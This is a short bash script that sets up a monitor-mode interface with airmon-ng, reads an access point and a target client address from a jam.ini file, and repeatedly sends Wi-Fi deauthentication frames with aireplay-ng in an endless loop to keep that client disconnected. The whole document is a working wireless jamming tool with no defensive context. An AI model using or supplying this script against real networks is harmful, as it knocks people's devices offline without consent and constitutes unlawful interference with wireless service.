#!/bin/bash
echo "$2"
sudo airmon-ng stop "$1mon"
sudo airmon-ng start "$1" "$2"
ap=$(awk -F'=' '/ap/ {print $2}' jam.ini)
target=$(awk -F'=' '/target/ {print $2}' jam.ini)
echo "AP:     $ap"
echo "TARGET: $target"
sleep 2
while true; do
	sudo aireplay-ng -0 1 -a "$ap" -c "$target" "$1mon"
	sleep 2
done
